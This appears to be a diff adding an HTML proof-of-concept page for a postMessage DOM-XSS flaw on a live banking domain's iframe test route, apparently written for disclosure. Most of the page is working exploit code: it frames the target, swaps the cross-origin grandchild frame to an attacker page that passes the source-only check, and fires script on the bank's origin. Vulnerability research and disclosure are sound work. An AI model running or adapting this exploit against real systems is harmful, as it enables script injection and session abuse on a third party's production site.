@@ -1,0 +1,39 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>requesttopay.db.com iframe-v1/test DOM-XSS PoC</title>
+<style>body{font:15px sans-serif;max-width:900px;margin:24px auto;padding:0 16px}
+code{background:#eee;padding:1px 4px;font-size:13px}iframe{width:100%;height:520px;border:2px solid #c1121f;margin-top:10px}
+#log{margin-top:10px;color:#060;font-family:monospace}</style>
+</head><body>
+  <h2>requesttopay.db.com <code>/iframe-v1/test</code> &mdash; source-only postMessage DOM-XSS</h2>
+  <p>The dev <b>Iframe test route</b> trusts any message whose <code>source</code> equals its embedded
+  frame's <code>WindowProxy</code> (no <code>origin</code> check), and passes <code>redirectURL</code> straight
+  to <code>globalThis.open()</code> (no scheme check). This page frames the route, then &mdash; as the
+  top-level ancestor &mdash; navigates its grandchild frame to our own <code>child.html</code> (the WindowProxy
+  identity is preserved, so the source check still passes).</p>
+  <ol>
+    <li>Wait for the frame to load (it auto-swaps the grandchild to the attacker child page).</li>
+    <li>Click <b>Fire XSS</b> inside the red child frame &mdash; <code>alert</code> fires on the
+      <code>requesttopay.db.com</code> origin + a banner is written into the real DB frame.</li>
+  </ol>
+  <div id="log">loading…</div>
+  <iframe id="f" src="https://requesttopay.db.com/iframe-v1/test"></iframe>
+  <script>
+    var CHILD = new URL('child.html', location.href).href;
+    window.addEventListener('message', function (e) {
+      if ((''+e.data).indexOf('PM3XSS') === 0) document.getElementById('log').textContent = '[XSS fired] ' + e.data;
+    });
+    var f = document.getElementById('f'), tries = 0;
+    var t = setInterval(function () {
+      try {
+        // navigate the grandchild (index 0) frame of the cross-origin test route to our origin
+        if (f.contentWindow && f.contentWindow[0]) {
+          f.contentWindow[0].location = CHILD;
+          document.getElementById('log').textContent =
+            'Grandchild frame swapped to attacker origin. Click "Fire XSS" in the red frame.';
+          clearInterval(t);
+        }
+      } catch (e) {}
+      if (++tries > 40) clearInterval(t);
+    }, 400);
+  </script>
+</body></html>
